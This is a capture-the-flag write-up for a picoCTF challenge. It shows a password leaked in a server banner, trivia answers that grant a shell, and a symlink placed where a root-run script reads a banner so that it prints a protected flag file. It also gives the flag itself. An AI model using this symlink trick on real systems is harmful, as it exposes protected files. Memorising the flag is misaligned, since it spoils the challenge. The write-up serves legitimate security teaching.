@@ -1,0 +1,93 @@
+---
+tags: []
+---
+# dont-you-love-banners
+
+- **Description:** Can you abuse the banner?
+- **Difficulty:** Medium
+
+---
+
+## 🔎 Solution
+The first server contains leaked information. Upon connecting, we discover the password: `My_Passw@rd_@1234`.
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc tethys.picoctf.net 53058
+SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
+```
+
+Next, we connect to the second server. 
+Here, we are prompted with a series of questions. 
+Answering them correctly grants us shell access, allowing us to execute commands.
+```bash
+what is the password? 
+My_Passw@rd_@1234
+What is the top cyber security conference in the world?
+DEF CON
+the first hacker ever was known for phreaking(making free phone calls), who was it?
+John Draper
+```
+
+Running `ls` in the home directory `~`, we find 2 files: `banner` and `text`. 
+Upon inspection, neither file appears to contain the flag.
+```bash
+player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ cat banner
+cat banner
+*************************************
+**************WELCOME****************
+*************************************
+player@challenge:~$ cat text
+cat text
+keep digging
+```  
+
+Navigating to the `/root` directory, we discover 2 files: `flag.txt` and `script.py`. 
+However, we don't have the necessary permissions to read `flag.txt`.
+```bash
+player@challenge:/root$ ls
+ls
+flag.txt  script.py
+player@challenge:/root$ cat flag.txt    
+cat flag.txt
+cat: flag.txt: Permission denied
+```
+
+Examining `script.py`, we learn that it is responsible for displaying the server's welcome message upon user connection. 
+Specifically, it reads and prints the contents of `/home/player/banner`, which we've already seen.
+```python
+ try:
+      with open("/home/player/banner", "r") as f:
+        print(f.read())
+    except:
+      print("*********************************************")
+      print("***************DEFAULT BANNER****************")
+      print("*Please supply banner in /home/player/banner*")
+      print("*********************************************")
+```
+
+Since we cannot read `flag.txt` directly due to permission restrictions, we consider using a **[symbolic link](https://www.geeksforgeeks.org/how-to-symlink-a-file-in-linux/)** (*symlink*). 
+A symlink is a special type of file that acts as a reference or shortcut to another file or directory.  
+To exploit this, we delete the original banner file and create a symlink that points to `/root/flag.txt`:
+```bash
+player@challenge:~$ rm -rf banner
+rm -rf banner
+player@challenge:~$ ln -s /root/flag.txt banner
+ln -s /root/flag.txt banner
+player@challenge:~$ ls
+ls
+banner  text
+```
+This command creates a symbolic link named banner that redirects to the restricted `flag.txt`.  
+Now, when a user connects to the server again, `script.py` reads the new banner - which is actually a symlink to `flag.txt`. 
+As a result, the contents of the flag are displayed on connection, successfully revealing the flag.
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc tethys.picoctf.net 55013
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
+```
+
+## 🚩Flag
+> `picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}`
